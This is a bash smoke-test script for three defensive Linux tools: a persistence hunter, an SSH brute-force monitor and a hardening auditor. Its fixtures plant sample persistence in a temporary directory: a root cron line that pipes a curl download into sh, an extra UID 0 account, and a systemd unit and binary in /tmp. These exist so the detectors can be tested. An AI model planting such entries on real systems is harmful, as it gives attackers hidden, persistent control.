#!/usr/bin/env bash
#
# Smoke tests for the three tools. Runs without root and changes nothing
# outside a temporary directory:
#
#   * linux_persistence_hunter.sh in offline mode against a small fake image
#     with planted persistence, at a path containing a quote
#   * secmon.sh against a synthetic auth.log with 25 brute-forcing IPs
#   * harden.sh audit functions (sourced, since the script itself needs root)
#
# Usage: bash tests/smoke.sh

set -uo pipefail
cd "$(dirname "$0")/.."

TMP=$(mktemp -d)
trap 'rm -rf -- "$TMP"' EXIT
FAILED=0

ok()   { printf 'ok    %s\n' "$1"; }
fail() { printf 'FAIL  %s\n' "$1"; FAILED=1; }
check() { # DESCRIPTION COMMAND...
    local what=$1; shift
    if "$@" >/dev/null 2>&1; then ok "$what"; else fail "$what"; fi
}

for f in harden.sh secmon.sh linux_persistence_hunter.sh; do
    check "$f: bash syntax" bash -n "$f"
done

# ─── linux_persistence_hunter.sh ───────────────────────────────────────────

IMG="$TMP/it's image"
mkdir -p "$IMG"/{etc/systemd/system,etc/cron.d,tmp,var/lib/dpkg/info,var/log,usr/bin,root,home/bob/.ssh}
printf 'root:x:0:0::/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\ntoor:x:0:0::/root:/bin/sh\n' > "$IMG/etc/passwd"
echo testimg > "$IMG/etc/hostname"
printf '/.\n/usr\n/usr/bin\n/usr/bin/true\n' > "$IMG/var/lib/dpkg/info/coreutils.list"
printf '[Service]\nExecStart=/tmp/.x/run\n' > "$IMG/etc/systemd/system/evil.service"
echo '* * * * * root curl http://example.invalid/a | sh' > "$IMG/etc/cron.d/upd"
cp /usr/bin/true "$IMG/tmp/kworker"
cp /usr/bin/true "$IMG/usr/bin/true"
echo 'ssh-ed25519 AAAA bob@laptop' > "$IMG/home/bob/.ssh/authorized_keys"

bash linux_persistence_hunter.sh -q -r "$IMG" -o "$TMP/hunt" --no-color >/dev/null 2>"$TMP/hunt.err"
rc=$?
csv=$(echo "$TMP"/hunt/*/findings.csv)
[[ $rc -eq 2 ]] && ok "hunter: exit code 2 on critical findings" || fail "hunter: exit code 2 on critical findings (got $rc)"
check "hunter: extra UID 0 account"          grep -q '"CRITICAL","ACCOUNT".*toor' "$csv"
check "hunter: download-and-execute cron"    grep -q '"CRITICAL","CRON","/etc/cron.d/upd:1"' "$csv"
check "hunter: unit runs from /tmp"          grep -q '"CRITICAL","SYSTEMD","/etc/systemd/system/evil.service:2"' "$csv"
check "hunter: unowned unit"                 grep -q '"MEDIUM","SYSTEMD","/etc/systemd/system/evil.service"' "$csv"
check "hunter: ELF in /tmp"                  grep -q '"HIGH","TMP-ARTIFACT","/tmp/kworker"' "$csv"
check "hunter: owned file is not flagged"    bash -c "! grep -q '/usr/bin/true' '$csv'"
check "hunter: evidence with quoted --root"  grep -q "evil.service" "$(echo "$TMP"/hunt/*/evidence.log)"
check "hunter: nothing on stderr"            bash -c "! grep -v '^\[\*\]' '$TMP/hunt.err' | grep -q ."

# ─── secmon.sh ─────────────────────────────────────────────────────────────

python3 - "$TMP/auth.log" <<'EOF'
import datetime, sys
now = datetime.datetime.now()
lines = []
for k in range(25):
    ip = f"{['192.0.2', '198.51.100', '203.0.113'][k % 3]}.{10 + k}"
    for j in range(60):
        t = (now - datetime.timedelta(minutes=120 - j)).strftime('%Y-%m-%dT%H:%M:%S.000000+00:00')
        lines.append(f"{t} host sshd[{1000 + j}]: Failed password for invalid user u{j % 12} from {ip} port 4{j:04d} ssh2")
lines.sort()
open(sys.argv[1], "w").write("\n".join(lines) + "\n")
EOF
printf 'AUTH_LOG=%s\nUSE_JOURNAL=no\n' "$TMP/auth.log" > "$TMP/secmon.conf"
bash secmon.sh --config "$TMP/secmon.conf" --sections ssh,bruteforce --no-color --no-dns \
    --report-dir "$TMP/secmon" --json > "$TMP/secmon.json" 2>"$TMP/secmon.err"
rc=$?
[[ $rc -eq 0 ]] && ok "secmon: exit code 0" || fail "secmon: exit code 0 (got $rc)"
check "secmon: 25 brute-force IPs, 1500 failures" python3 -c "
import json, sys
s = json.load(open('$TMP/secmon.json'))['stats']
sys.exit(not (s['bruteforce_ips'] == 25 and s['ssh_failure_events'] == 1500))"

# ─── harden.sh (audit only; the script refuses to run without root) ────────

cat > "$TMP/harden_audit.sh" <<'EOF'
source ./harden.sh
set +e; trap - ERR
setup_colors; QUIET=1
RUN_DIR="$1"; mkdir -p "$RUN_DIR"; LOG_FILE="$RUN_DIR/run.log"; : > "$LOG_FILE"
WORK_DIR=$(mktemp -d -p "$1")
run_audit >/dev/null 2>&1
printf '%s\n' "${F_ID[@]}"
EOF
bash "$TMP/harden_audit.sh" "$TMP/harden" > "$TMP/harden.ids" 2>&1
for id in FS-002 FS-003 FS-004 KRN-MOD-1; do
    check "harden: audit reports $id" grep -qx "$id" "$TMP/harden.ids"
done

echo
if [[ $FAILED -eq 0 ]]; then echo "All smoke tests passed"; else echo "Some smoke tests FAILED"; fi
exit "$FAILED"
